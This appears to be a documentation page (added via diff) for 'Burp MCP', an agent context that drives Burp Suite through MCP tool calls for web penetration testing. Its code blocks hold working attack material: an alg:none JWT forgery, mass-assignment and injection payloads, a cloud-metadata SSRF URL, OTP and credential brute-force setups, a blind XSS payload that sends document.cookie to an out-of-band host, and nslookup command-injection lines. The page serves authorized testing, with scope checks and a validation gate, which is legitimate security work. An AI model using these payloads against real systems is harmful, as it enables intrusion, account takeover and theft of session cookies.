@@ -1,0 +1,396 @@
+---
+title: Burp MCP
+description: Control Burp Suite programmatically through MCP — proxy history, active scanning, Intruder fuzzing, Repeater, scope management, and OOB detection.
+---
+
+<Info>
+  **Category:** Integrations
+</Info>
+
+**Load this context**
+
+Ask your agent:
+
+```
+get the burp-mcp context
+```
+
+---
+
+## Summary
+
+BurpMCP is a Model Context Protocol (MCP) server that exposes Burp Suite's full capabilities to AI agents, bridging the gap between agent-driven reasoning and Burp's interception, scanning, and manipulation tools.
+
+- Phase 0 provides a complete tool catalog covering proxy history, scope, HTTP requests, Intruder, Scanner, Sitemap, encoding, and Collaborator tools
+- Phase 1 covers setup and scope configuration before any testing begins
+- Phase 2 uses Burp's accumulated data for recon — endpoint mapping, high-value target discovery, and annotation
+- Phases 3–4 cover manual request testing (Repeater) and automated fuzzing (Intruder) — IDOR, credential brute-force, injection fuzzing, endpoint discovery
+- Phase 5 runs Burp's active scanner with fine-grained audit check control and issue triage
+- Phase 6 handles out-of-band detection via Collaborator for blind SSRF, XSS, XXE, and command injection
+- Phases 7–9 enforce a validation gate, false positive filter, and structured reporting handoff to `finding-writer`, `cvss-scorer`, and `pentest-report` skills
+
+---
+
+## CONTEXT.md
+
+### When to Use This Context
+
+Load this context when:
+
+- Controlling Burp Suite programmatically through MCP tool calls
+- Sending, intercepting, or replaying HTTP requests via the agent
+- Retrieving and analysing proxy history, scanner issues, or sitemap data
+- Running active scans or Intruder attacks from the agent
+- Automating repetitive pentest tasks (brute-forcing, fuzzing, parameter testing)
+- Building end-to-end pentest workflows entirely through MCP tool calls
+- Integrating Burp findings with `finding-writer`, `cvss-scorer`, or `pentest-report` skills
+
+**Decision flow — where to start:**
+1. First engagement on a target → Phase 1 (Setup & Scope) then Phase 2 (Recon via Proxy History and Sitemap)
+2. Specific endpoint to test → Phase 3 (Request Crafting and Repeater) then Phase 5 (Active Scanning)
+3. Have a list of endpoints → Phase 4 (Intruder / Fuzzing Automation)
+4. Burp Scanner already ran → Phase 6 (Issue Triage and Reporting)
+5. Uncertain what's possible → read the full Tool Catalog in Phase 0
+
+**Key principle:** Always work within scope. Add targets to Burp scope before any active testing. Every active scan, Intruder attack, and brute-force must be explicitly scoped.
+
+---
+
+### Phase 0 — Tool Catalog
+
+#### Proxy & HTTP History
+
+| Tool | What it does |
+|---|---|
+| `get_proxy_history` | Retrieves captured requests/responses with filters (host, method, status, URL, scope) |
+| `get_proxy_history_item` | Full request/response detail for a single proxy history entry |
+| `search_proxy_history` | Full-text or regex search across requests and responses |
+| `highlight_proxy_item` | Color-codes a proxy history item for human review |
+| `add_comment_to_proxy_item` | Adds a text comment to a proxy history entry |
+
+#### Scope Management
+
+| Tool | What it does |
+|---|---|
+| `get_scope` | Returns current include/exclude scope configuration |
+| `add_to_scope` | Adds a URL or pattern to Burp's target scope |
+| `remove_from_scope` | Removes a URL from scope |
+| `is_in_scope` | Checks whether a specific URL is currently in scope |
+
+#### HTTP Request Tools
+
+| Tool | What it does |
+|---|---|
+| `send_http_request` | Sends a crafted HTTP request through Burp and returns the full response |
+| `send_to_repeater` | Adds a request to Burp's Repeater tab |
+| `get_repeater_tabs` | Lists all open Repeater tabs |
+| `send_repeater_request` | Sends the request in a Repeater tab and returns the response |
+
+#### Intruder / Fuzzing
+
+| Tool | What it does |
+|---|---|
+| `send_to_intruder` | Configures an Intruder attack with `§`-delimited injection positions |
+| `configure_intruder_payloads` | Sets payload source: simple list, numbers, brute forcer, custom iterator |
+| `start_intruder_attack` | Launches the configured attack |
+| `get_intruder_results` | Retrieves results, filterable by status code, length, or body content |
+| `stop_intruder_attack` | Stops a running attack |
+
+#### Active Scanner
+
+| Tool | What it does |
+|---|---|
+| `start_active_scan` | Launches Burp's scanner against specific URLs or the full scope |
+| `get_scan_status` | Checks scan progress and issues found so far |
+| `get_scanner_issues` | Retrieves findings, filterable by severity, confidence, host, or issue type |
+| `get_scanner_issue_detail` | Full detail for a single issue including CVSS, CWE, remediation |
+| `cancel_scan` | Stops an active scan |
+
+#### Sitemap, Encoding & Collaborator
+
+| Tool | What it does |
+|---|---|
+| `get_sitemap` | All URLs Burp has discovered (proxy + spider + scanner) |
+| `get_sitemap_item` | Request and response for a specific sitemap entry |
+| `encode_decode` | URL, base64, HTML, hex encode/decode and hash operations |
+| `get_collaborator_payload` | Generates a unique Burp Collaborator interaction URL |
+| `poll_collaborator` | Checks DNS/HTTP/SMTP interactions for a Collaborator payload |
+
+---
+
+### Phase 1 — Setup and Scope Configuration
+
+Before any testing begins, configure Burp and establish scope.
+
+```python
+list_tools()                                         # confirm BurpMCP is live
+
+get_scope()                                          # view current scope
+add_to_scope(url="https://target.com")               # add primary target
+add_to_scope(url="https://api.target.com")           # add API subdomain
+remove_from_scope(url="https://target.com/logout")   # exclude logout endpoint
+get_scope()                                          # confirm
+
+is_in_scope(url="https://target.com/api/user/1234")  # always check before active tests
+# → { in_scope: true }  → proceed
+# → { in_scope: false } → STOP
+
+send_http_request(method="GET", url="https://target.com/", follow_redirects=True)
+get_proxy_history(filter={ "host": "target.com", "limit": 5 })
+# Confirm the request appears in history — if not, proxy is not intercepting traffic
+```
+
+---
+
+### Phase 2 — Reconnaissance via Burp
+
+Use Burp's accumulated data to map the attack surface before any active testing.
+
+```python
+# Full proxy history
+history = get_proxy_history(filter={ "in_scope": True, "limit": 5000 })
+
+# High-value target discovery
+search_proxy_history(query="/\\d{3,}/", search_in="request", regex=True)                    # IDOR candidates
+search_proxy_history(query="reset|forgot|password", search_in="request", regex=True)        # Account mgmt
+search_proxy_history(query="/admin/|/dashboard/", search_in="request", regex=True)          # Admin endpoints
+search_proxy_history(query="eyJ[a-zA-Z0-9]{10,}\\.", search_in="request", regex=True)      # JWT tokens
+search_proxy_history(query="token|secret|api_key", search_in="response")                    # Secrets in responses
+
+# Sitemap review
+sitemap = get_sitemap(host="target.com", in_scope=True, show_only_with_responses=True)
+# Prioritise: 403 (bypass candidates), 401 (auth-required), 500 (injection candidates)
+
+# Annotate findings
+highlight_proxy_item(id=item.id, color="orange")
+add_comment_to_proxy_item(id=item.id, comment="IDOR candidate — numeric ID in path")
+```
+
+---
+
+### Phase 3 — Manual Request Testing (Repeater)
+
+```python
+# Baseline request
+baseline = send_http_request(
+    method="GET",
+    url="https://target.com/api/user/1234",
+    headers={"Authorization": "Bearer eyJ...", "Cookie": "session=abc123"}
+)
+
+# IDOR — access another user's ID
+other = send_http_request(method="GET", url="https://target.com/api/user/1235",
+    headers={"Authorization": "Bearer <your_token>"})
+
+# Auth bypass — alg:none JWT
+none_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ."
+send_http_request(method="GET", url="https://target.com/api/user/me",
+    headers={"Authorization": f"Bearer {none_jwt}"})
+
+# Mass assignment
+send_http_request(method="POST", url="https://target.com/api/user/register",
+    headers={"Content-Type": "application/json"},
+    body='{"username":"evil","password":"evil","email":"evil@evil.com","role":"admin","is_admin":true}')
+
+# Send to Repeater for follow-up
+raw = "GET /api/user/1234 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer eyJ...\r\n\r\n"
+send_to_repeater(request=raw, host="target.com", port=443, use_https=True, tab_name="IDOR — /api/user/{id}")
+```
+
+---
+
+### Phase 4 — Automated Fuzzing (Intruder)
+
+```python
+# IDOR enumeration — numeric IDs
+request = "GET /api/user/§1234§ HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer eyJ...\r\n\r\n"
+send_to_intruder(request=request, host="target.com", port=443, use_https=True, attack_type="sniper")
+configure_intruder_payloads(position_index=0, payload_type="numbers", number_from=1, number_to=9999)
+attack = start_intruder_attack(throttle_ms=150, concurrent_threads=5)
+results = get_intruder_results(attack_id=attack.attack_id, filter={ "status_code": 200 })
+
+# Injection fuzzing
+payloads = [
+    "' OR '1'='1", "{{7*7}}", "${7*7}",
+    "<script>alert(1)</script>",
+    "http://169.254.169.254/latest/meta-data/",
+    "; sleep 5", "| sleep 5"
+]
+configure_intruder_payloads(position_index=0, payload_type="simple_list", payloads=payloads)
+results = get_intruder_results(attack_id=attack.attack_id, filter={ "length_differs_from": baseline_length })
+
+# OTP brute-force
+configure_intruder_payloads(position_index=0, payload_type="numbers", number_from=0, number_to=999999)
+attack = start_intruder_attack(throttle_ms=50, concurrent_threads=10)
+```
+
+Intruder attack types:
+
+| Type | Use case |
+|---|---|
+| `sniper` | One payload set, one position — IDOR IDs, parameter discovery |
+| `battering_ram` | One payload set in all positions simultaneously |
+| `pitchfork` | Multiple payload sets iterated together — credential stuffing |
+| `cluster_bomb` | All combinations — brute-force with user + pass lists |
+
+---
+
+### Phase 5 — Active Scanning
+
+```python
+# Always confirm scope first
+is_in_scope(url="https://target.com/api/")
+
+# Balanced scope-wide scan
+scan = start_active_scan(
+    scope_only=True,
+    scan_config="balanced",
+    audit_checks={
+        "sqli": True, "xss": True, "os_command_injection": True,
+        "path_traversal": True, "ssrf": True, "xxe": True,
+        "ssti": True, "open_redirect": True, "cors": True
+    }
+)
+
+# Monitor progress every 30s
+status = get_scan_status(scan_id=scan.scan_id)
+# status.progress_percent, status.issues_found_so_far
+
+# Triage — prioritise certain/firm high findings
+issues = get_scanner_issues(scan_id=scan.scan_id)
+for issue in issues:
+    detail = get_scanner_issue_detail(issue_id=issue.issue_id)
+    # Manually replay every finding before reporting
+    verification = send_http_request(method=detail.request.method, url=detail.request.url,
+        headers=detail.request.headers, body=detail.request.body)
+```
+
+---
+
+### Phase 6 — Out-of-Band (OOB) Detection
+
+```python
+# Blind SSRF
+collab = get_collaborator_payload()
+send_http_request(method="POST", url="https://target.com/api/webhook",
+    headers={"Authorization": "Bearer <token>", "Content-Type": "application/json"},
+    body=f'{{"url": "http://{collab.payload}/ssrf-test"}}')
+interactions = poll_collaborator(payload=collab.payload)
+# DNS or HTTP interaction → blind SSRF confirmed
+
+# Blind XSS (stored in admin-visible field)
+blind_xss = f'"><script>fetch("http://{collab.payload}/xss?c="+document.cookie)</script>'
+send_http_request(method="POST", url="https://target.com/api/support/ticket",
+    headers={"Authorization": "Bearer <user_token>", "Content-Type": "application/json"},
+    body=f'{{"subject": "Help", "body": "{blind_xss}"}}')
+
+# Blind command injection
+payloads = [f"`nslookup {collab.payload}`", f"$(nslookup {collab.payload})", f"; nslookup {collab.payload}"]
+for payload in payloads:
+    encoded = encode_decode(value=payload, operation="url_encode")
+    send_http_request(method="GET", url=f"https://target.com/api/ping?host={encoded.result}",
+        headers={"Authorization": "Bearer <token>"})
+```
+
+---
+
+### Phase 7 — Validation Gate
+
+Before reporting any finding, validate it is real, reproducible, and impactful.
+
+```
+[ ] Reproduced in a clean session (fresh cookies/token, different user account)
+[ ] Finding affects resources beyond the tester's own account
+[ ] Impact demonstrated with real evidence (not theoretical)
+[ ] Full raw request and response captured via get_proxy_history_item
+[ ] Scanner findings manually replayed with send_http_request
+[ ] Finding confirmed in scope via is_in_scope()
+[ ] Collaborator interactions corroborated with a second poll
+```
+
+---
+
+### Phase 8 — False Positive Filter
+
+Do not report without additional exploitation evidence:
+
+```
+[ ] Scanner "Tentative" confidence findings — always replay manually first
+[ ] Intruder response length difference ≤ 10 bytes (likely noise)
+[ ] Missing security headers without a working exploit chain
+[ ] CSRF on endpoints requiring re-authentication
+[ ] Self-XSS (executes only in your own browser)
+[ ] Time-based SQLi where variance is < 4s (may be network jitter)
+[ ] Intruder 200 responses returning your own user data
+```
+
+---
+
+### Phase 9 — Reporting
+
+```python
+# Collect evidence per finding
+issue = get_scanner_issue_detail(issue_id="iss-abc123")
+proxy_item = get_proxy_history_item(id=1452)
+
+# Hand off to reporting skills
+# finding-writer       → structures raw request/response into a finding
+# cvss-scorer          → computes CVSS 3.1 base score
+# remediation-planner  → generates a prioritised fix plan
+# pentest-report       → assembles all findings into a full engagement report
+```
+
+---
+
+### Quick Reference — Tool by Attack Class
+
+| Attack Class | Primary Tools | Key Config |
+|---|---|---|
+| IDOR Enumeration | `send_to_intruder`, `get_intruder_results` | `attack_type: sniper`, `payload_type: numbers` |
+| Credential Brute-force | `send_to_intruder`, `start_intruder_attack` | `attack_type: cluster_bomb`, throttle 500ms+ |
+| Manual Tampering | `send_http_request`, `send_to_repeater` | Full headers + body manipulation |
+| Blind SSRF | `get_collaborator_payload`, `poll_collaborator` | Inject payload URL, poll after 5s |
+| Blind XSS | `get_collaborator_payload`, `poll_collaborator` | Inject into admin-visible fields, poll after 2min |
+| Active Scanning | `start_active_scan`, `get_scanner_issues` | `scan_config: balanced`, `scope_only: true` |
+| Attack Surface Map | `get_proxy_history`, `get_sitemap` | `in_scope: true`, regex search |
+| Blind Command Injection | `get_collaborator_payload`, `encode_decode` | `nslookup`/`curl` to collaborator |
+| Scope Management | `get_scope`, `add_to_scope`, `is_in_scope` | Always check before active tests |
+
+---
+
+### Troubleshooting
+
+**BurpMCP tools not available:**
+Check Burp → Extensions → Installed, confirm BurpMCP is loaded. Check `~/.claude/mcp.json` port matches extension config. Reload the extension and check the output tab for errors.
+
+**`send_http_request` returns connection errors:**
+Burp proxy must be running on `127.0.0.1:8080`. Install Burp CA certificate in the system trust store for HTTPS targets.
+
+**`get_proxy_history` returns empty:**
+Traffic is not routing through Burp. Configure browser or app to use `127.0.0.1:8080`. Check Burp Proxy → Options → Proxy Listeners.
+
+**Intruder is slow (Community Edition):**
+Burp Community limits Intruder to 1 thread with throttling. Burp Pro removes this — set `concurrent_threads` to 20+.
+
+**Collaborator shows no interactions:**
+Target server may not have internet access — use interactsh as an alternative. Increase `time.sleep` before polling. Verify the payload was injected by checking proxy history.
+
+**Scanner issues are all "Tentative":**
+Always replay tentative findings manually with `send_http_request`. Run a `thorough` scan on specific endpoints for higher-confidence results.
+
+---
+
+## Related contexts
+
+<CardGroup cols={2}>
+  <Card title="web-app-pentest" href="/contexts/web-app-pentest">
+    Full web application pentest methodology: recon, auth, injection, business logic
+
+    `Rifteo-Community/contexts`
+  </Card>
+  <Card title="cloud-audit" href="/contexts/cloud-audit">
+    AWS, Azure, and GCP security — IAM, storage, networking, secrets, and logging
+
+    `Rifteo-Community/contexts`
+  </Card>
+</CardGroup>
